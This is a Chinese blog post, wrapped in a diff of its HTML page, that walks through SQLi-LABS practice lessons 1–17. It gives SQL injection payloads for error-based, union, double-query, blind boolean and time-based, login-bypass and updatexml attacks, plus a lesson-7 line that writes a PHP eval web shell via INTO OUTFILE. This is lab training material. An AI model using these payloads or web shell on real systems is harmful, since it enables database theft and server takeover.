@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="notwiner">
+    
+    <meta name="description" content="notwiner的小站,notwiner,博客,博客笔记">
+    
+    
+    
+    
+    
+    
+    <title>sqli-labs训练-day1-2 | notwiner</title>
+    <link href="http://www.notwiner.top" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://www.notwiner.top">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">notwiner</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/notes/">notes</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/program/">program</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/web/">web</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
+                        </li>
+                        
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/Burpsuite/">Burpsuite</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/Git/">Git</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/PHP/">PHP</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/sql/">sql</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/XSS/">XSS</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/hexo/">hexo</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/todo">
+                        <i class="fa fa-list"></i>计划书单
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://www.notwiner.top">notwiner</a>
+        >
+        <span>sqli-labs训练-day1-2</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2020/01/15/sqli-labs%E5%AD%A6%E4%B9%A0/">sqli-labs训练-day1-2</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/sql/">sql</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2020-01-15
+            </span>
+            
+			<span class="label label-gal">
+				<p id="busuanzi_value_page_pv" class="fa fa-eye"></p>
+            </span>
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2020/01/15/sqli-labs%E5%AD%A6%E4%B9%A0/">sqli-labs训练-day1-2</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2020-01-15
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/sql/">sql</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>新学习sql注入，找个东西训练下。<span id="more"></span></p>
+<h1 id="SQLi-LABS训练"><a href="#SQLi-LABS训练" class="headerlink" title="SQLi-LABS训练"></a>SQLi-LABS训练</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看《SQL注入攻击与防御》简单学习了WEB的SQL注入，找了SQLi-LABS进行训练，</p>
+<p>搭建不再赘述，用的是<a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">phpstudy</a>和<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-libs</a>，下载完sqli-labs安装包放到WWW文件夹解压然后点击Setup/reset Database for labs即可，</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/L5K85NLRmfef.jpg" alt="mark"></p>
+<p>出现这个类型的样式即为成功。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/5xY0soWBOIA2.jpg" alt="mark"></p>
+<h2 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson-1"></a>lesson-1</h2><p>GET-Error based-Single quote-String</p>
+<p>根据页面提示?id=1，发现返回登录名称和密码，重复测试，id=2直到id=15，发现id=15没有返回，确定通过这种方式可以遍历数据库，不过和题意关系不大。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/vACVW5JF1TzE.jpg" alt="mark"></p>
+<p>加’测试</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/SmB9QS8QTLjo.jpg" alt="mark"></p>
+<p>报错为”1”说明存在字符注入，使用—+注释掉后面语句，并用order by语句判断字段当为4时候报错Unknown columb ‘4’ in ‘order clause’说明存在三列</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/294lvuUpn2Rl.jpg" alt="mark"></p>
+<p>然后union语句根据order by得到的显示位回显，注意这里前面要出错，因为源码调用了mysql_fetch_array一次，导致这里只会出现第一行查询结果，出错前面为空，这样才能显示所查询的内容。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/ISllOv314JMp.jpg" alt="mark"></p>
+<p>union构造成功，然后可以开始爆库一条龙。注意database()为查询数据库名，version()为查询版本号，@@version_compile_os为操作系统信息，@@datadir为数据库路径</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/AhEaQtFTAYQ3.jpg" alt="mark"></p>
+<p>table_name即为表名，schemation即为数据库名。找到user爆列名</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/JMOvIdRR4e8s.jpg" alt="mark"></p>
+<p>找到password可以返回所有用户+密码</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/r1i2lqz5Lsgo.jpg" alt="mark"></p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/wlvQ21tskOKJ.jpg" alt="mark"></p>
+<p>这一关结束。</p>
+<h2 id="lesson-2"><a href="#lesson-2" class="headerlink" title="lesson-2"></a>lesson-2</h2><p>GET-Error based-Intiger based</p>
+<p>输入id，加’发现返回这样的错误，只需要注释</p>
+<p> ，直接order by猜列数，然后union构造即可。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/J4gWmdnUlufs.jpg" alt="mark"></p>
+<p>结果如下<img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/7QWEsIcw4W4L.jpg" alt="mark"></p>
+<h2 id="lesson-3"><a href="#lesson-3" class="headerlink" title="lesson-3"></a>lesson-3</h2><p>GET-Error based-Single quotes with twist-string</p>
+<p>还是一样，构造id=1’报错，发现与前面不太一样，为”1”)，对比与lesson-1的图，构造?id=1’’)，成功。后面依旧一个套路。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/0DizX4AoOs9m.jpg" alt="mark"></p>
+<p>结果如下</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/W9AMBv33fqcx.jpg" alt="mark"></p>
+<h2 id="lesson-4"><a href="#lesson-4" class="headerlink" title="lesson-4"></a>lesson-4</h2><p>GET-Error based-Double Quotes-String</p>
+<p>id=1’没报错，测试双引号”报错，</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/vEwjFxnkOCyd.jpg" alt="mark"></p>
+<p>根据报错信息推测是(“$id”)，PHP中双引号内单引号会被作为转义，由于后有)构造为?id”)，后面一个套路即可，结果如下。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/TUVdARMcif3o.jpg" alt="mark"></p>
+<h2 id="lesson-5"><a href="#lesson-5" class="headerlink" title="lesson-5"></a>lesson-5</h2><p>GET-Double Injection-Single Quotes-String</p>
+<p>根据题目提示为双查询注入，其实就是嵌套语句，第五关开始变的有难度，推荐先补下SQL数据库，<a target="_blank" rel="noopener" href="https://editor.csdn.net/md/?articleId=103972224">SQL部分基础语法</a>，<a href="">SQL</a>,</p>
+<p>需要掌握的基本语句：嵌套，count()，substring()，limit()，floor()，rand()等等。</p>
+<p>如上面一样，先测试id=1’返回”1”说明没啥id构造没问题，—+进行注释掉后面语句。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/mqrqc6Arb1gl.jpg" alt="mark"></p>
+<p>order by查列数，还是3，</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/xaNs1S3RPded.jpg" alt="mark"></p>
+<p><code>union select 1,2,3</code>还是可以，在后爆数据库名称已经发现得不到回显了，只会有个You are in…..的显示，开始主题，双查询注入。</p>
+<p><code>select database()</code>结果是返回数据库名称，as xxx为取别名，group by为排序。</p>
+<p><code>floor (rand()*2)</code>里面是rand()先返回一个0-1的小数，floor()为取不大于某数的最大整数值，所以结果不是0就是1。</p>
+<p>使用concat()连接后只有两种结果，而加上<code>from table_name</code>后会返回一个两种随机结果的集合，而其数目由表本身和concat连接语句决定，<del>具体的牵扯到数据库键值与计数的问题，不过多阐述</del>。又由于键值与计数的随机存储问题，导致多次才会使结果报错，因此几次尝试后可以得到数据库名称，当然到现在为止语句以及构建完成，后面的就是爆表名、列名一条龙。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/t5tKg7zntFrf.jpg" alt="mark"></p>
+<p>通过数据库名爆表名，由于返回只有一条而且无可以连接的显示框架，所以使用limit()截断依次得到表名，（limit从0开始）</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/r3KlgncG7afn.jpg" alt="mark"></p>
+<p>试到3时成功找到存储用户的表名。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/jeQON4WqQHDU.jpg" alt="mark"></p>
+<p>继续通过表名爆列名。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/BiMXG4RSap5e.jpg" alt="mark"></p>
+<p>爆到密码的列名。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/iGWG5r18p2a5.jpg" alt="mark"></p>
+<p>爆字段。这里通过修改limit()即可切换不同用户名和密码的字段。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/DnKBmvDHGRJS.jpg" alt="mark"></p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/Ip48QjygJaQv.jpg" alt="mark"></p>
+<p>密码字段。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/JRv6ws9GuGBk.jpg" alt="mark"></p>
+<h2 id="lesson-6"><a href="#lesson-6" class="headerlink" title="lesson-6"></a>lesson-6</h2><p><em>2020-01-20</em></p>
+<p>GET-double injection-double quotes-string</p>
+<p>看提示就知道和5类似，</p>
+<p>?id=1后加’没有报错，加”为<code>?id=1&quot;</code>报错，后面和5类似。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/1BOFxgKlx8Nk.jpg" alt="mark"></p>
+<p>最后结果如图</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/SazlY4wzxjik.jpg" alt="mark"></p>
+<h2 id="lesson-7"><a href="#lesson-7" class="headerlink" title="lesson-7"></a>lesson-7</h2><p>GET-Double Injection-Single Quotes-String</p>
+<p>需要掌握的：mysql的文件操作，load_file()、into outfile，可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/like98k/article/details/79452002，">https://blog.csdn.net/like98k/article/details/79452002，</a></p>
+<p>先构造id，<code>?id&#39;))--+</code>，由于是文件导入的方式注入，需要知道文件路径，先从其他的关卡得到绝对路径。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/Hct4d51ld68r.jpg" alt="mark"></p>
+<p>根据路径写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3 into outfile &quot;路径\自定义的文件名&quot;</span><br><span class="line">union select 1,2,&#x27;&lt;?php @eval($_post[“自定义”])?&gt;&#x27; into outfile &quot;路径\xx.php&quot;</span><br></pre></td></tr></table></figure>
+<p>之后可以菜刀连接。</p>
+<h2 id="lesson-8"><a href="#lesson-8" class="headerlink" title="lesson-8"></a>lesson-8</h2><p>GET-Blind-Boolian Based-Single Quotes</p>
+<p>需要掌握：length()、ascii()、substr()、regxp()等盲注相关。</p>
+<p>由于无回显只能盲注，简单来说就是利用ascii根据if的判断是否有回显验证是否注入正确的方式，包括布尔盲注、时间盲注和报错盲注。这次采用布尔盲注。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/LVjOBNeAkSsB.jpg" alt="mark"></p>
+<p>数据库名第一个ASCII字符是否大于64，是则为1，回显正常。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/PPQkUENmJeWH.jpg" alt="mark"></p>
+<p>测试数据是否大于115(ascii为s)无回显，重复测试即可确定数据库名称。</p>
+<ul>
+<li>判断数据库名长度，if(length(database())=8,1,0)</li>
+<li>爆数据库名，if(ascii(substr((select database()),1,1))&gt;xx,1,0)</li>
+<li>爆表名，if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))&gt;xx,1,0)</li>
+<li>爆列名，if(ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))&gt;xx,1,0)</li>
+<li>爆字段，if(ascii(substr((select username from users limit 0,1),1,1))&gt;xx,1,0)</li>
+</ul>
+<h2 id="lesson-9"><a href="#lesson-9" class="headerlink" title="lesson-9"></a>lesson-9</h2><p>GET-Blind-Time based-Single Quotes</p>
+<p>需要掌握：sleep()。</p>
+<p>提示时间注入，其实上一题也可以时间注入，简单来说就是通过响应的时间判断是否注入成功以及是否判断正确。也是盲注。</p>
+<p>先构造，<code>?id=1 --+</code></p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/4bOsIigR43rS.jpg" alt="mark"></p>
+<ul>
+<li>爆数据库名，and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))</li>
+<li>判断数据库长度，and if(length(datbase())=8,sleep(5),1)</li>
+<li>爆表名、列名、字段类似。</li>
+</ul>
+<h2 id="lesson-10"><a href="#lesson-10" class="headerlink" title="lesson-10"></a>lesson-10</h2><p>GET-Blind-Time based-double quotes</p>
+<p>注意提示，和lesson-9除了单双引号没有区别。</p>
+<hr>
+<p>下一部分就是POST相关的注入了。</p>
+<hr>
+<h2 id="lesson-11"><a href="#lesson-11" class="headerlink" title="lesson-11"></a>lesson-11</h2><p><em>2020-01-22</em></p>
+<p>POST-Error Based-Single quotes-String</p>
+<p>考查POST登录方面的注入，先看源码中post传输所用名称，hackbar等插件时有用</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/gtv472VvNVB5.jpg" alt="mark"></p>
+<p>测试用户名<code>&#39;or 1=1#</code>，密码为空或不填均可。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/eVxDREkwLVl2.jpg" alt="mark"></p>
+<p>回显成功，解释是：如GET的MYSQL语句类似，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where uname=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>在输入<code>&#39;or 1=1#</code>后，原语句变为： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where uname=&#x27; &#x27;or 1=1# &#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>where判断中uname与passwd均为0，1=1成1，or连接，且#将后面语句注释，成功注入。</p>
+<p>其他已可行的注入语句。</p>
+<ul>
+<li><code>admin&#39;or&#39;1&#39;=&#39;1#</code></li>
+</ul>
+<p>然后可以开始查询数据库列数。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/nW8HFI2d7ctI.jpg" alt="mark"></p>
+<p>回显与<code>&#39;or 1=1#</code>类似，回显用户名与密码不一样在在于<code>&#39;or 1=1#</code>返回的为默认第一个用户，而后面的指定了用户名为admin。<strong>值得注意的是POST与GET终于不太一样，列数不为3。。。</strong></p>
+<p>爆数据库<em>类似的爆版本号不再赘述</em></p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/sHDU9CQDRFaq.jpg" alt="mark"></p>
+<p>爆表名</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/GOvcgP2BBydl.jpg" alt="mark"></p>
+<p>爆列名</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/hBXibVJBWK6L.jpg" alt="mark"></p>
+<p>爆字段</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/dgzqLsQ3zeqy.jpg" alt="mark"></p>
+<p>收工</p>
+<p>PS：这关没啥难点，但是注意注释符号#有用，—+没用，原因是PHP版本的问题，找不到大佬的链接了，以后补上。</p>
+<h2 id="lesson-12"><a href="#lesson-12" class="headerlink" title="lesson-12"></a>lesson-12</h2><p>POST-Error Based-Double quotes-String-with twist</p>
+<p>看提示就知道类型一样，字符串方式不一样。</p>
+<p>先试<code>admin&#39;</code>没有回显，再测试<code>admin&quot;</code>（前面是%27，后面是%22），有回显</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/JG9Qb9DdkDRN.jpg" alt="mark"></p>
+<p>根据保错估计是id=(“”)这种类型。测试加上#回显没问题。</p>
+<p>然后爆数据库名称等等</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/XTld98SbiLR4.jpg" alt="mark"></p>
+<p>收工。</p>
+<h2 id="lesson-13"><a href="#lesson-13" class="headerlink" title="lesson-13"></a>lesson-13</h2><p>POST-Double Injection-Single quotes-String-with twist</p>
+<p>还是单引号双引号还有括号都测试，然后发现<code>&#39;)</code>有效，连接发现无回显。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/btXFFzPHkxm5.jpg" alt="mark"></p>
+<p>emmm很明显可以盲注。。但是看了提示发现和lesson-5差不多，可以使用双查询语句。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/aNee3e18izlF.jpg" alt="mark"></p>
+<p>爆数据表</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/IRLAAQYAIhur.jpg" alt="mark"></p>
+<p>爆列名</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/QSVFOndK9blA.jpg" alt="mark"></p>
+<p>爆字段，用户名与密码对应。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/BxDbyC0vV959.jpg" alt="mark"></p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/diMtSie9MBdA.jpg" alt="mark"></p>
+<p>即第2个（limit从0开始的）帐号和密码为Angelina和I-kill-you，依次可遍历数据库所有信息。</p>
+<h2 id="lesson-14"><a href="#lesson-14" class="headerlink" title="lesson-14"></a>lesson-14</h2><p>POST-Double Injection-Single quotes-String-with twist</p>
+<p>蛋疼，两个关卡一样，明天看看官方的是不是下错了。</p>
+<h2 id="lesson-15"><a href="#lesson-15" class="headerlink" title="lesson-15"></a>lesson-15</h2><p><em>2020-02-23</em></p>
+<p>POST-Blind Boolian/time Based-Single quotes</p>
+<p>根据提示，布尔注入或者时间注入，16也是，不过16双引号，所以这个先测试布尔注入，lesson-16测试时间注入。</p>
+<p>先构造注入点，为<code>uname=admin&#39; #&amp;passwd=1</code>，</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/RQYO5XQVinMO.jpg" alt="mark"></p>
+<p>因为是布尔盲注，先猜数据库名称长度。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/w2OmjR4XNLKf.jpg" alt="mark"></p>
+<p>然后判断数据库名称、表名称、列名称、字段。参考lesson-8</p>
+<ul>
+<li>判断数据库名长度，if(length(database())=8,1,0)</li>
+<li>爆数据库名，if(ascii(substr((select database()),1,1))&gt;xx,1,0)</li>
+<li>爆表名，if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))&gt;xx,1,0)</li>
+<li>爆列名，if(ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))&gt;xx,1,0)</li>
+<li>爆字段，if(ascii(substr((select username from users limit 0,1),1,1))&gt;xx,1,0)</li>
+</ul>
+<h2 id="lesson-16"><a href="#lesson-16" class="headerlink" title="lesson-16"></a>lesson-16</h2><p>POST-Blind-Boolian/Time Based-Double quotes</p>
+<p>测试时间注入，</p>
+<p>先构造基本的注入点</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/UP9YkmbIGHOw.jpg" alt="mark"></p>
+<p>判断数据库长度、数据库名称、表名、列名、字段。</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/fxkpCs1bqRJX.jpg" alt="mark"></p>
+<p>和布尔注入类似。</p>
+<hr>
+<p>开始有waf，对字符进行处理。</p>
+<hr>
+<h2 id="lesson-17"><a href="#lesson-17" class="headerlink" title="lesson-17"></a>lesson-17</h2><p>POST-Update Query-Error Based-String</p>
+<p>查看源码（摘取部分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">//making sure uname is not injectable</span><br><span class="line">$uname=check_input($_POST[&#x27;uname&#x27;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\n&quot;);</span><br><span class="line">fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+<p>需要掌握知识：update</p>
+<p>由于用户名uname已经有很多限制，所以选择passwd来去起作用。</p>
+<p><code>passwd=1%27 and updatexml(1,concat(&quot;:&quot;,(select database()),&quot;:&quot;),1) #</code></p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/RuJcIp0v68sE.jpg" alt="mark"></p>
+<p>接下来爆表名</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/0jkGKf4aRHAF.jpg" alt="mark"></p>
+<p>爆列名</p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/VP919LV0NHlV.jpg" alt="mark"></p>
+<p><img src="http://q52vvh5qj.bkt.clouddn.com/photo/20200204/gTrNH362o454.jpg" alt="mark"></p>
+<p><strong>爆字段并未成功，先留着</strong></p>
+<h2 id="lesson-18"><a href="#lesson-18" class="headerlink" title="lesson-18"></a>lesson-18</h2><p>POST-Header Injection-Uagent field-Error based</p>
+<h2 id="lesson-19"><a href="#lesson-19" class="headerlink" title="lesson-19"></a>lesson-19</h2><p>POST-Header Injection-Referer field-Error based</p>
+<h2 id="lesson-20"><a href="#lesson-20" class="headerlink" title="lesson-20"></a>lesson-20</h2><p>POST-Cookie injections-Uagent field-error based</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://p0desta.com/2018/01/28/Sqli_labs通关文档/">Sqli-labs通关文档</a></p>
